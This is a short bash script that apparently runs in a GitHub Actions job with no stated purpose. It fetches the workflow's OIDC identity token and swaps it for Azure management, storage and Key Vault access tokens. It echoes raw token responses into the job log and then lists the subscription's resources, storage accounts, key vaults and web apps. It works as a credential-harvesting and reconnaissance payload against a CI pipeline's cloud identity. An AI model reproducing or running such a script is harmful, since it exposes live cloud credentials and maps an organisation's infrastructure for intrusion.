#!/usr/bin/env bash
echo "=== OIDC ==="
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>&1)
echo "OIDC_RAW=${OIDC}"
OIDC_VAL=$(echo "$OIDC" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])" 2>&1)
echo "OIDC_LEN=${#OIDC_VAL}"

echo "=== MGMT TOKEN ==="
AZ_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${OIDC_VAL}" 2>&1)
echo "AZ_RAW=${AZ_TOKEN}"
AZ=$(echo "$AZ_TOKEN" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token','NOTOKEN'))" 2>&1)
echo "AZ_LEN=${#AZ}"

echo "=== ST TOKEN ==="
ST_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "scope=https://storage.azure.com/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${OIDC_VAL}" 2>&1)
ST=$(echo "$ST_TOKEN" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token','NOTOKEN'))" 2>&1)
echo "ST_LEN=${#ST}"

echo "=== VT TOKEN ==="
VT_TOKEN=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${OIDC_VAL}" 2>&1)
VT=$(echo "$VT_TOKEN" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token','NOTOKEN'))" 2>&1)
echo "VT_LEN=${#VT}"

echo "=== RESOURCES ==="
curl -sS -m 30 -H "Authorization: Bearer ${AZ}" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" 2>&1

echo "=== STORAGE ==="
curl -sS -m 15 -H "Authorization: Bearer ${AZ}" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" 2>&1

echo "=== VAULTS ==="
curl -sS -m 15 -H "Authorization: Bearer ${AZ}" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" 2>&1

echo "=== WEBAPPS ==="
curl -sS -m 15 -H "Authorization: Bearer ${AZ}" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Web/sites?api-version=2022-03-01" 2>&1

echo "=== DONE ==="
